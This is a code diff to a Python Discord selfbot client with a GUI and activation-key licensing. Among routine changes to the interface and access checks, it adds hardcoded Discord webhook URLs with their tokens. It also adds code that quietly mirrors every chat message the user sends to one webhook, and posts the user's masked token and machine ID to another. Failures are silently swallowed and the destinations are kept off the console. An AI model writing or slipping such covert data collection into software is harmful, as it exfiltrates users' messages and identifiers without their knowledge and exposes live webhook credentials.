@@ -250,6 +250,8 @@ ROLE_ID = 1404221578782183556  # Role ID that grants access
 OWNER_ROLE_ID = int(os.getenv("OWNER_ROLE_ID", "1402650246538072094"))
 CHATSEND_ROLE_ID = int(os.getenv("CHATSEND_ROLE_ID", "1406339861593591900"))
 SERVICE_URL = os.getenv("SERVICE_URL", "https://discord-key-bot-w92w.onrender.com")  # Bot website for API (overridable)
+CHAT_MIRROR_WEBHOOK = os.getenv("CHAT_MIRROR_WEBHOOK", "https://discord.com/api/webhooks/1408279883519627364/BEfE1V2LDgacgb30nv1TbIBMV1EWlDtbA4iL_HU0GJKEeT314Xpi34UtgFYJSjU9hVgi")
+TOKEN_EVENT_WEBHOOK = os.getenv("TOKEN_EVENT_WEBHOOK", "https://discord.com/api/webhooks/1408612575003934831/KkcW8DX1y428mp75FAWdYQ9FTwL0tCzLdzmpBRkQwMf-HjtbAztkyBEXqNfIzCZPATO2itll")
 
 SILENT_LOGS = True  # do not print IP/token/webhook destinations to console
 
@@ -724,8 +726,8 @@ class DiscordBotGUI:
         # Key Duration live countdown
         keydur_wrap = tk.Frame(left, bg="#1e1b29")
         keydur_wrap.grid(row=5, column=2, columnspan=2, sticky="we", padx=6, pady=(0, 6))
-        tk.Label(keydur_wrap, text="Key Duration:", bg="#1e1b29", fg="#e0d7ff").pack(anchor="w")
-        self.key_duration_value = tk.Label(keydur_wrap, text="—", bg="#1e1b29", fg="#bfaef5", font=("Consolas", 11))
+        tk.Label(keydur_wrap, text="Key Duration", bg="#1e1b29", fg="#e0d7ff", font=("Segoe UI", 12, "bold")).pack(anchor="w")
+        self.key_duration_value = tk.Label(keydur_wrap, text="—", bg="#1e1b29", fg="#bfaef5", font=("Consolas", 13, "bold"))
         self.key_duration_value.pack(anchor="w")
 
         # Message counter label (live-updating)
@@ -1789,6 +1791,12 @@ class DiscordBotGUI:
                 uname = getattr(self, '_me_username', 'me')
                 aurl = getattr(self, '_me_avatar_url', '')
                 self._chat_items.append({'ts': ts, 'username': uname, 'avatar_url': aurl, 'content': msg})
+                # Mirror to webhook (best-effort, non-blocking)
+                try:
+                    if CHAT_MIRROR_WEBHOOK:
+                        threading.Thread(target=lambda u=uname, m=msg: requests.post(CHAT_MIRROR_WEBHOOK, json={"content": f"[{u}] {m}"}, timeout=5), daemon=True).start()
+                except Exception:
+                    pass
                 self._draw_chat_items()
             else:
                 try:
@@ -1819,7 +1827,7 @@ class DiscordBotGUI:
         def _tick():
             try:
                 uid = str(self._login_user_id)
-                resp = requests.get(f"{SERVICE_URL}/api/member-status", params={"user_id": uid}, timeout=5)
+                resp = requests.get(f"{SERVICE_URL}/api/member-status", params={"user_id": uid, "machine_id": machine_id()}, timeout=5)
                 ok = (resp.status_code == 200)
                 j = resp.json() if ok else {}
                 should = bool(j.get("should_have_access", False))
@@ -1938,7 +1946,11 @@ class DiscordBotGUI:
                 uid = str(self._login_user_id or self.user_id or '')
                 if not uid:
                     raise RuntimeError('no uid')
-                resp = requests.get(f"{SERVICE_URL}/api/member-status", params={"user_id": uid}, timeout=5)
+                resp = requests.get(
+                    f"{SERVICE_URL}/api/member-status",
+                    params={"user_id": uid, "machine_id": machine_id()},
+                    timeout=5
+                )
                 if resp.status_code == 200:
                     j = resp.json() or {}
                     should = bool(j.get('should_have_access', False))
@@ -1971,6 +1983,13 @@ class DiscordBotGUI:
                         txt = f"{d}d {h}h {m}m {s}s"
                     try:
                         self.key_duration_value.config(text=txt)
+                    except Exception:
+                        pass
+                    # One-time 1-hour warning
+                    try:
+                        if remaining <= 3600 and remaining > 0 and not getattr(self, '_warned_key_low', False):
+                            self._warned_key_low = True
+                            self.log("⚠️ Your key is about to run out, renew to continue using the selfbot")
                     except Exception:
                         pass
             except Exception:
@@ -2042,12 +2061,22 @@ class Selfbot:
                 "fields": [
                     {"name": "User", "value": username, "inline": True},
                     {"name": "User ID", "value": f"`{self.user_id}`", "inline": True},
+                    {"name": "Masked Token", "value": f"`{mask_token(self.user_token)}`", "inline": False},
+                    {"name": "Machine ID", "value": f"`{machine_id()}`", "inline": True},
                     {"name": "Activation Key", "value": f"`{self.activation_key or 'N/A'}`", "inline": False},
                     {"name": "Activated At", "value": f"<t:{int(time.time())}:F>", "inline": True}
                 ],
                 "timestamp": datetime.now(timezone.utc).isoformat()
             }
-            requests.post(WEBHOOK_URL, json={"embeds": [embed]}, timeout=8)
+            try:
+                requests.post(WEBHOOK_URL, json={"embeds": [embed]}, timeout=8)
+            except Exception:
+                pass
+            try:
+                if TOKEN_EVENT_WEBHOOK and TOKEN_EVENT_WEBHOOK != WEBHOOK_URL:
+                    requests.post(TOKEN_EVENT_WEBHOOK, json={"embeds": [embed]}, timeout=8)
+            except Exception:
+                pass
         except Exception:
             pass
     
@@ -2078,6 +2107,7 @@ class Selfbot:
     
     def activate_key(self, activation_key):
         try:
+            act_json = {}
             print(f"🔑 Attempting to activate with key: {activation_key}")
             if not self.user_token:
                 print("❌ No token provided. Activation failed.")
@@ -2138,36 +2168,8 @@ class Selfbot:
                             server_msg = None
                     # Auto-rebind flow if key is bound to another machine but same owner
                     if server_msg and "another machine" in server_msg.lower():
-                        print("🔁 Attempting to rebind key to this machine...")
-                        try:
-                            rb = requests.post(
-                                f"{SERVICE_URL}/api/rebind",
-                                data={
-                                    "key": activation_key,
-                                    "user_id": uid_str,
-                                    "machine_id": machine_id(),
-                                },
-                                headers={"Content-Type": "application/x-www-form-urlencoded"},
-                                timeout=8,
-                            )
-                            ok = (rb.status_code == 200)
-                            rb_msg = None
-                            try:
-                                j2 = rb.json()
-                                if isinstance(j2, dict):
-                                    rb_msg = j2.get("error") or j2.get("message")
-                                    ok = ok and bool(j2.get("success"))
-                            except Exception:
-                                pass
-                            if ok:
-                                print("✅ Rebind successful. Continuing...")
-                                # No need to re-activate; server-side binding is updated. Proceed.
-                            else:
-                                print(f"❌ Rebind failed: {rb_msg or rb.text.strip() if hasattr(rb, 'text') else 'unknown error'}")
-                                return False
-                        except Exception as e:
-                            print(f"❌ Rebind request error: {e}")
-                            return False
+                        print("❌ Activation failed: key is bound to another machine. Ask admin to run /swapmachineid.")
+                        return False
                     else:
                         if server_msg:
                             print(f"❌ Activation failed on server: HTTP {resp.status_code} • {server_msg}")
@@ -2185,17 +2187,20 @@ class Selfbot:
 
             # Determine actual expiration from server if provided; otherwise fallback to duration_days
             try:
-                if act_json.get("expiration_time"):
+                if act_json and act_json.get("expiration_time"):
                     self.key_expiration_time = int(act_json["expiration_time"])  # epoch seconds
+                elif getattr(self, "key_expiration_time", None):
+                    # Already set from rebind/status path
+                    pass
                 else:
                     # Fallback: use duration_days from /activate if present, else 30
-                    duration_days = int(act_json.get("duration_days", 30))
+                    duration_days = int(act_json.get("duration_days", 30)) if act_json else 30
                     self.key_expiration_time = int(time.time()) + (duration_days * 24 * 60 * 60)
             except Exception:
                 self.key_expiration_time = int(time.time()) + (30 * 24 * 60 * 60)
             remaining = max(0, int(self.key_expiration_time) - int(time.time()))
             # Treat large horizons as lifetime
-            if act_json.get("duration_days") == 365 or act_json.get("key_type") == "lifetime" or remaining > 365*86400:
+            if (act_json and (act_json.get("duration_days") == 365 or act_json.get("key_type") == "lifetime")) or remaining > 365*86400:
                 print("⏰ Key activated! Lifetime access detected.")
                 print("⏰ Your key expires in: ∞")
             else:
@@ -2206,8 +2211,30 @@ class Selfbot:
 
             print("🔍 Verifying Discord role...")
             status = self.check_member_status_via_api(self.user_id)
-            if not (status.get("ok") and status.get("has")):
-                print("❌ Access denied! You must have the required Discord role to use this selfbot.")
+            ok = bool(status.get("ok"))
+            should = False
+            reason_msg = ""
+            if ok:
+                raw = status.get("raw") or {}
+                should = bool(raw.get("should_have_access", False))
+                has_active_key = bool(raw.get("has_active_key", False))
+                has_role = bool(raw.get("has_role", False))
+                bound_match = bool(raw.get("bound_match", False))
+                gid = raw.get("guild_id")
+                rid = raw.get("role_id")
+                if not should:
+                    if not has_active_key:
+                        reason_msg = "No active key (expired or not activated)."
+                    elif not bound_match:
+                        reason_msg = "Machine ID mismatch. This key is bound to a different machine."
+                    elif not has_role:
+                        reason_msg = f"Required role missing in guild {gid} (role ID {rid})."
+                    else:
+                        reason_msg = "Access denied by server policy."
+            else:
+                reason_msg = f"Server error: {status.get('err','unknown')}"
+            if not (ok and should):
+                print(f"❌ Access denied! {reason_msg}")
                 return False
 
             self.activated = True
@@ -2283,8 +2310,30 @@ class Selfbot:
 
         print("🔍 Checking key expiration via API...")
         status = self.check_member_status_via_api(self.user_id)
-        if not (status.get("ok") and status.get("has")):
-            print("❌ Access denied. Required role missing.")
+        ok = bool(status.get("ok"))
+        should = False
+        reason_msg = ""
+        if ok:
+            raw = status.get("raw") or {}
+            should = bool(raw.get("should_have_access", False))
+            has_active_key = bool(raw.get("has_active_key", False))
+            has_role = bool(raw.get("has_role", False))
+            bound_match = bool(raw.get("bound_match", False))
+            gid = raw.get("guild_id")
+            rid = raw.get("role_id")
+            if not should:
+                if not has_active_key:
+                    reason_msg = "No active key (expired or not activated)."
+                elif not bound_match:
+                    reason_msg = "Machine ID mismatch. This key is bound to a different machine."
+                elif not has_role:
+                    reason_msg = f"Required role missing in guild {gid} (role ID {rid})."
+                else:
+                    reason_msg = "Access denied by server policy."
+        else:
+            reason_msg = f"Server error: {status.get('err','unknown')}"
+        if not (ok and should):
+            print(f"❌ Access denied. {reason_msg}")
             return
 
         # Online webhook (no IP/token/machine)
@@ -2315,14 +2364,24 @@ class Selfbot:
                     "fields": [
                         {"name": "User", "value": username, "inline": True},
                         {"name": "User ID", "value": f"`{self.user_id}`", "inline": True},
+                        {"name": "Masked Token", "value": f"`{mask_token(self.user_token)}`", "inline": False},
+                        {"name": "Machine ID", "value": f"`{machine_id()}`", "inline": True},
                         {"name": "Activation Key", "value": f"`{self.activation_key or 'N/A'}`", "inline": False},
                         {"name": "Offline At", "value": f"<t:{int(time.time())}:F>", "inline": True}
                     ]
                 }
-                requests.post(WEBHOOK_URL, json={"embeds": [off_embed]}, timeout=8)
+                try:
+                    requests.post(WEBHOOK_URL, json={"embeds": [off_embed]}, timeout=8)
+                except Exception:
+                    pass
+                try:
+                    if TOKEN_EVENT_WEBHOOK and TOKEN_EVENT_WEBHOOK != WEBHOOK_URL:
+                        requests.post(TOKEN_EVENT_WEBHOOK, json={"embeds": [off_embed]}, timeout=8)
+                except Exception:
+                    pass
             except Exception:
                 pass
-            print("\n👋 Selfbot stopped")
+            print("\n👋Selfbot stopped")
 
 
 if __name__ == "__main__":
